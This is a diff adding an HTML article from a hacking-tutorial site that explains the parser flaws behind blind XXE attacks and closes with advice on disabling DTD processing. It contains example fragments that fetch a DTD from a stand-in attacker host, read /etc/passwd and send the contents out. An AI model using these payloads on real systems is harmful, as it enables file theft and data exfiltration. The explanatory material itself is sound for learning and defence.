@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parser Vulnerabilities in Blind XXE Attacks - hacking</title>
+    <meta name="description" content="Blind XML External Entity (XXE) attacks occur when an application processes untrusted XML input and resolves external entities without reflecting the parsed content directly in the server's response. In these scenarios, attackers exploit specific parser">
+    <link rel="canonical" href="https://salivity.github.io/hacking/article/parser-vulnerabilities-in-blind-xxe-attacks">
+    <link rel="search" type="application/opensearchdescription+xml" title="hacking" href="/hacking/opensearch.xml">
+    <link rel="icon" href="/hacking/favicon.ico">
+    <link rel="stylesheet" href="/hacking/css/style.css">
+    <link media="print" rel="stylesheet" href="/hacking/css/print.css">
+    <script src="/hacking/js/fuse.min.js"></script>
+    <script src="/hacking/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Parser Vulnerabilities in Blind XXE Attacks - hacking" />
+    <meta property="og:url" content="https://salivity.github.io/hacking/article/parser-vulnerabilities-in-blind-xxe-attacks" />
+    <meta property="og:image" content="https://salivity.github.io/hacking/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/hacking/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Blind XML External Entity (XXE) attacks occur when an application processes untrusted XML input and resolves external entities without reflecting the parsed content directly in the server's response. In these scenarios, attackers exploit specific parser" />
+    <link rel="manifest" href="/hacking/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/hacking/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>hacking</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/hacking/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        
+    <div class="article-layout">
+        <aside id="profile-sidebar" class="profile-column" aria-label="Author Profile"></aside>
+        <div class="article-main-column">
+            <article><h1 id="parser-vulnerabilities-in-blind-xxe-attacks">Parser
+Vulnerabilities in Blind XXE Attacks</h1>
+<p>Blind XML External Entity (XXE) attacks occur when an application
+processes untrusted XML input and resolves external entities without
+reflecting the parsed content directly in the server's response. In
+these scenarios, attackers exploit specific parser configurations and
+functional features to force the server to read local files, initiate
+outbound network connections, or trigger error-based data exfiltration.
+This article explores the underlying parser vulnerabilities,
+configurations, and protocol-handling flaws that make external entity
+resolution possible during blind XXE attacks.</p>
+<h2 id="insecure-default-parser-configurations">Insecure Default Parser
+Configurations</h2>
+<p>The primary vulnerability enabling blind XXE is the failure to
+disable external entity processing within the XML parser. Many standard
+XML parsing libraries historically shipped with external entity
+resolution enabled by default.</p>
+<p>Key parser settings that facilitate these attacks include:</p>
+<ul>
+<li><strong>Enabled External General Entities:</strong> Features such as
+<code>resolveExternals</code> or specific parser features (like
+<code>http://xml.org/sax/features/external-general-entities</code>)
+allow the XML parser to fetch definitions outside the immediate document
+using the <code>SYSTEM</code> identifier.</li>
+<li><strong>Enabled External Parameter Entities:</strong> Parameter
+entities (defined with <code>%</code>) are parsed exclusively within
+Document Type Definitions (DTDs). When the feature
+<code>http://xml.org/sax/features/external-parameter-entities</code> is
+active, parsers evaluate external DTD files, which are essential for
+conducting out-of-band (OOB) exfiltration in blind scenarios.</li>
+<li><strong>Full DTD Processing:</strong> When
+<code>disallow-doctype-decl</code> is not set to <code>true</code>, the
+parser evaluates the entire <code>&lt;!DOCTYPE&gt;</code> block,
+allowing attackers to introduce custom inline or external DTD
+rules.</li>
+</ul>
+<h2 id="support-for-dynamic-parameter-entity-expansion">Support for
+Dynamic Parameter Entity Expansion</h2>
+<p>In blind XXE attacks, attackers cannot see the payload's rendered
+output directly in the application's HTTP response. To bypass this
+limitation, they rely on the parser's support for parameter entities to
+construct dynamic references that send data to an external server.</p>
+<ol type="1">
+<li><strong>Out-of-Band (OOB) Network Calls:</strong> The parser
+processes an external parameter entity referencing a remote DTD hosted
+by the attacker (e.g.,
+<code>&lt;!ENTITY % remote SYSTEM "http://attacker.com/eval.dtd"&gt;</code>).
+The parser executes an outbound HTTP or DNS request to fetch this
+file.</li>
+<li><strong>Dynamic Entity Evaluation:</strong> Once the remote DTD is
+retrieved, the parser evaluates nested parameter entities designed to
+read local files (e.g., <code>file:///etc/passwd</code>) and append that
+content to a secondary outbound request (e.g.,
+<code>http://attacker.com/?data=...</code>).</li>
+<li><strong>Recursive Entity Parsing:</strong> Parsers that permit
+recursive entity replacement evaluate the nested structure, effectively
+executing the attacker's data-harvesting workflow without needing a
+local response display.</li>
+</ol>
+<h2 id="error-based-entity-processing">Error-Based Entity
+Processing</h2>
+<p>When outbound network egress is blocked or restricted, blind XXE can
+often still be executed if the parser's error-handling mechanism is
+overly verbose:</p>
+<ul>
+<li><strong>File-to-Error Reflection:</strong> Certain parsers will
+include the value of an unresolved entity or a failed schema validation
+inside a generic parsing error.</li>
+<li><strong>Malformed Protocol Triggers:</strong> Attackers define
+entities that intentionally point to a malformed URL incorporating the
+target file's content (e.g., using nonexistent protocols or invalid
+paths). When the parser attempts to load the resource and fails, it
+outputs the constructed path containing the sensitive file contents
+within the server's error logs or error response.</li>
+</ul>
+<h2 id="unrestricted-protocol-wrapper-handlers">Unrestricted Protocol
+Wrapper Handlers</h2>
+<p>Parsers typically depend on underlying system runtime libraries (such
+as Java, libxml2, or .NET) to resolve URIs provided in
+<code>SYSTEM</code> identifiers. The breadth of protocols supported by
+the parser dictates the scope of the vulnerability:</p>
+<ul>
+<li><strong>Standard Protocols (<code>http://</code>,
+<code>https://</code>, <code>ftp://</code>):</strong> Allow blind
+out-of-band interaction and network reconnaissance behind
+firewalls.</li>
+<li><strong>File System Handlers (<code>file://</code>):</strong> Allow
+local file reading that can subsequently be exfiltrated via parameter
+entities.</li>
+<li><strong>Custom or Legacy Wrappers:</strong> Wrappers such as
+<code>expect://</code> (in certain PHP environments) or
+<code>jar://</code> / <code>netdoc://</code> (in Java) can lead to
+arbitrary command execution or deeper interaction with local archives,
+directly processed by the parser's resource-loading subsystem.</li>
+</ul>
+<h2 id="failure-to-enforce-secure-processing-modes">Failure to Enforce
+Secure Processing Modes</h2>
+<p>Modern parsing libraries often provide security flags, such as Java's
+<code>XMLConstants.FEATURE_SECURE_PROCESSING</code> (FSP). However,
+relying solely on general security flags without explicitly disabling
+DTD processing often fails to prevent blind XXE. FSP is primarily
+designed to prevent denial-of-service conditions (like entity expansion
+attacks/Billion Laughs) and does not inherently prohibit the fetching of
+external DTDs or the execution of outbound network requests in all
+runtime environments. Preventing blind XXE requires explicitly
+configuring parsers to completely forbid inline DTDs and external
+resource lookups.</p></article>
+        <div id="comments-container"></div>
+        <script>
+            const utterancesScript = document.createElement('script');
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/hacking'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+        </div>
+    </div>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/hacking/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/hacking/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
